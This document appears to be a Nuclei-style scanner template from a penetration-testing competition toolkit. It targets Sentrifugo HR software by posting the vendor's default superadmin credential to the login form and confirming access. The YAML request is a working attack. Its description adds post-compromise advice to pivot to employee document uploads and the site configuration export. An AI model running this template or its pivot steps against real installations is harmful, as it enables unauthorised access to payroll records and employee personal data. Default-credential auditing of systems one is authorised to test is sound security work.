# Sentrifugo default credential login attempt.
id: sentrifugo-default-login

info:
  name: Sentrifugo HRMS Default Credentials
  author: cptc-toolkit
  severity: high
  metadata:
    max-request: 1
    kind: attack
  description: |
    Sentrifugo is a self-hosted HR management suite. Stock installs document
    the superadmin credential admin:sentrifugo and the application never
    forces it to be changed.

    This template POSTs the default credential to the login form and matches
    the authenticated dashboard marker. A match means full HR access: payroll
    records, employee PII, documents and the site configuration screens.
    Pivot to the employee document uploads and the site config export first.

    One POST request. The credential is a documented vendor default.
  reference:
    - https://github.com/sentrifugo/sentrifugo
  tags: themepark,hr,default-login,attack

http:
  - raw:
      - |
        POST /index.php/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin&password=sentrifugo&loginsubmit=LOG+IN
    redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        condition: or
        words:
          - "Main Menu"
      - type: word
        part: body
        negative: true
        words:
          - "loginsubmit"
          - "incorrect"
